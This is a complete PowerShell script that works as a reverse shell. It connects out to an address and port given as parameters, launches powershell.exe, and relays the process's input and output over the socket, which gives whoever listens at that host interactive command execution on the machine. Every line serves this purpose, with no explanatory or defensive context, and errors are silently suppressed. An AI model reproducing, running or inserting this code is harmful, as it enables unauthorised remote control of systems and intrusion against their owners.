param (
    [Parameter(Position = 0, Mandatory = $true)]
    [String]$address,

    [Parameter(Position = 1, Mandatory = $false)]
    [String]$port = 1337,

    [Parameter(Position = 2, Mandatory = $false)]
    [String]$filename = 'powershell.exe',

    [Parameter(Position = 3, Mandatory = $false)]
    [String]$arguments = ''
)


$socket = New-Object System.Net.Sockets.TcpClient($address, $port)
$socket_stream = $socket.GetStream()
$socket_mutex_name = [Guid]::NewGuid().ToString()

$process_start_info = New-Object System.Diagnostics.ProcessStartInfo($filename, $arguments)
$process_start_info.UseShellExecute = $false
$process_start_info.CreateNoWindow = $false
$process_start_info.RedirectStandardInput = $true
$process_start_info.RedirectStandardOutput = $true
$process_start_info.RedirectStandardError = $true

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $process_start_info
[void]$process.Start()


$input_redirector = {
    param (
        [System.IO.Stream]$from, # from socket stream
        [System.IO.Stream]$to # to stdin
    )

    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read_count = $from.Read($buffer, 0, $buffer.Length)

            if ($bytes_read_count -eq 0)
            {
                break # stream has been closed, connection was probably terminated
            }

            $to.Write($buffer, 0, $bytes_read_count)
            $to.Flush()
            [Array]::Clear($buffer, 0, $bytes_read_count)
        } 
        catch { <# shh... #> }
    }
}

$output_redirector = {
    param (
        [System.IO.Stream]$from, # from stdout or stderr
        [System.IO.Stream]$to, # to socket stream
        [String]$mutex_name
    )

    $locked = $false # this is needed because apparently .NET lets you stack mutex locks and releases
    $lock = New-Object System.Threading.Mutex($false, $mutex_name) # get named mutex
    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read_count = $from.Read($buffer, 0, $buffer.Length)

            if ($bytes_read_count -eq 0)
            {
                if ($locked)
                {
                    $lock.ReleaseMutex()
                    $locked = $false
                }

                break # stream has been closed, process probably exited
            }

            if (-not $locked)
            {
                [void]$lock.WaitOne()
                $locked = $true
            }

            $to.Write($buffer, 0, $bytes_read_count)
            [Array]::Clear($buffer, 0, $bytes_read_count)

            if (-not $from.DataAvailable)
            {
                $to.Flush()
                
                if ($locked)
                {
                    $lock.ReleaseMutex()
                    $locked = $false
                }
            }
        }
        catch {}
    }
}


$stdin_handler = Start-ThreadJob -ScriptBlock $input_redirector -ArgumentList $socket_stream, $process.StandardInput.BaseStream
$stdout_handler = Start-ThreadJob -ScriptBlock $output_redirector -ArgumentList $process.StandardOutput.BaseStream, $socket_stream, $socket_mutex_name
$stderr_handler = Start-ThreadJob -ScriptBlock $output_redirector -ArgumentList $process.StandardError.BaseStream, $socket_stream, $socket_mutex_name


while ($true)
{
    $stdin_handler_state = (Get-Job -Id $stdin_handler.Id).State
    $stdout_handler_state = (Get-Job -Id $stdout_handler.Id).State
    $stderr_handler_state = (Get-Job -Id $stderr_handler.Id).State
    
    # this completes when the connection is terminated
    if ($stdin_handler_state -eq 'Completed' -or $stdin_handler_state -eq 'Failed')
    {
        break
    }

    # these complete when the process exits
    if ($stdout_handler_state -eq 'Completed' -or $stdout_handler_state -eq 'Failed')
    {
        break
    }

    if ($stderr_handler_state -eq 'Completed' -or $stderr_handler_state -eq 'Failed')
    {
        break
    }
}


Stop-Job $stdin_handler
Stop-Job $stdout_handler
Stop-Job $stderr_handler

Remove-Job $stdin_handler -Force
Remove-Job $stdout_handler -Force
Remove-Job $stderr_handler -Force

$process.Dispose()
$socket.Dispose()